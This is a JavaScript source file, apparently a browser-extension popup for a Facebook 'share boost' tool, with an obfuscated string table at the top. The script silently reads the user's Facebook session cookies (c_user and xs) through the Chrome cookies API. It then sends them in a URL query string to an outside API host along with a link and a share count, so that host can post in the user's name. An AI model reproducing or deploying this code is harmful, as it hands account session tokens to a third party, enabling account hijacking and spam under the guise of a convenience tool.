function getStrings() {
    const strings = [
        '59586WxIuJb', 'light', '#fecaca', 'body', '_self', 'error', '&link=',
        '_blank', 'addEventListener', '112540iLhNYm', 'darkModeSwitch', 'status',
        'message', '879iLwAot', '2226640JjpVgm', 'Failed to share.', '&limit=',
        '✅ Shared ', 'cookie', '1436hMwpBB', '❌ Please fill all fields!',
        'https://vern-rest-api.vercel.app/api/share?cookie=', 'features.html', 'limit',
        'innerHTML', 'name', 'backBtn', 'nav-links', '#fff', 'active', 'cookies',
        'classList', 'change', '; xs=', 'query', 'c_user', 'trim',
        '❌ Error! Check network or cookie.', '55TiHFnF', 'textContent', 'burger', 
        'color', 'c_user=', 'shareBtn', 'toggle', 'click', 'success_count',
        'getElementById', ' times!', 'find', 'tutorials', 'style', 'link',
        '1897368SzZakT', '4VNqJmA', '<i class="fas fa-spinner fa-spin icon"></i> Processing...',
        '1187379SkhyzH', '1348669Foowgj', 'open', 'https://www.facebook.com', 'GET',
        'dark', 'developer', 'value', 'json'
    ];
    return strings;
}

function getString(index) {
    const strings = getStrings();
    return strings[index - 0xaa];
}

(function(stringsFunc, target) {
    const getStr = getString;
    const arr = stringsFunc();
    while (true) {
        try {
            const calc = parseInt(getStr(0xd3)) / 1 * (-parseInt(getStr(0xe7)) / 2)
                + parseInt(getStr(0xaa)) / 3 * (parseInt(getStr(0xb0)) / 4)
                + parseInt(getStr(0xc3)) / 5 * (parseInt(getStr(0xde)) / 6)
                + -parseInt(getStr(0xd6)) / 7
                + parseInt(getStr(0xd2)) / 8
                - parseInt(getStr(0xd5)) / 9
                + parseInt(getStr(0xab)) / 10;
            if (calc === target) break;
            else arr.push(arr.shift());
        } catch (e) {
            arr.push(arr.shift());
        }
    }
})(getStrings, 0x1e6a9);

const burger       = document.getElementById('burger');
const navLinks     = document.getElementById('nav-links');
const darkModeSwitch = document.getElementById('darkModeSwitch');
const developerBtn = document.getElementById('developer');
const tutorialsBtn = document.getElementById('tutorials');
const backBtn      = document.getElementById('backBtn');
const shareBtn     = document.getElementById('shareBtn');
const statusEl     = document.getElementById('status');
const cookieInput  = document.getElementById('cookie');
const linkInput    = document.getElementById('link');
const limitInput   = document.getElementById('limit');

burger.addEventListener('click', () => {
    navLinks.classList.toggle('active');
});

darkModeSwitch.addEventListener('change', () => {
    document.body.classList.toggle('dark');
    document.body.classList.toggle('light');
});

developerBtn.addEventListener('click', () => {
    window.open('https://www.facebook.com/notfound500', '_self');
});

tutorialsBtn.addEventListener('click', () => {
    window.open('tutorial.html', '_blank');
});

backBtn.addEventListener('click', () => {
    window.open('features.html', '_self');
});

shareBtn.addEventListener('click', async () => {
    const cookie = cookieInput.value.trim();
    const link = linkInput.value.trim();
    const limit = limitInput.value.trim();

    if (!cookie || !link || !limit) {
        statusEl.textContent = '❌ Please fill all fields!';
        statusEl.style.color = '#fecaca';
        return;
    }

    shareBtn.innerHTML = '<i class="fas fa-spinner fa-spin icon"></i> Processing...';
    shareBtn.disabled = true;
    statusEl.innerHTML = '<i class="fas fa-spinner fa-spin icon"></i> Processing boost...';
    statusEl.style.color = '#fff';

    try {
        const response = await fetch(
            'https://vern-rest-api.vercel.app/api/share?cookie='
            + encodeURIComponent(cookie)
            + '&link=' + encodeURIComponent(link)
            + '&limit=' + encodeURIComponent(limit),
            { method: 'GET' }
        );

        const data = await response.json();

        if (data.status) {
            statusEl.textContent = '✅ Shared ' + data.success_count + ' times!';
            statusEl.style.color = '#d1fae5';
        } else {
            statusEl.textContent = '❌ ' + (data.message || 'Failed to share.');
            statusEl.style.color = '#fecaca';
        }
    } catch (err) {
        statusEl.textContent = '❌ Error! Check network or cookie.';
        statusEl.style.color = '#fecaca';
        console.error(err);
    } finally {
        shareBtn.textContent = 'Share';
        shareBtn.disabled = false;
    }
});

chrome.tabs.query({ active: true, currentWindow: true }, tabs => {
    const tab = tabs[0];
    if (!tab) return;

    chrome.cookies.getAll({ url: 'https://www.facebook.com' }, cookies => {
        const cUserCookie = cookies.find(c => c.name === 'c_user');
        const xsCookie = cookies.find(c => c.name === 'xs');

        if (cUserCookie && xsCookie) {
            cookieInput.value = 'c_user=' + cUserCookie.value + '; xs=' + xsCookie.value + ';';
        }
    });
});
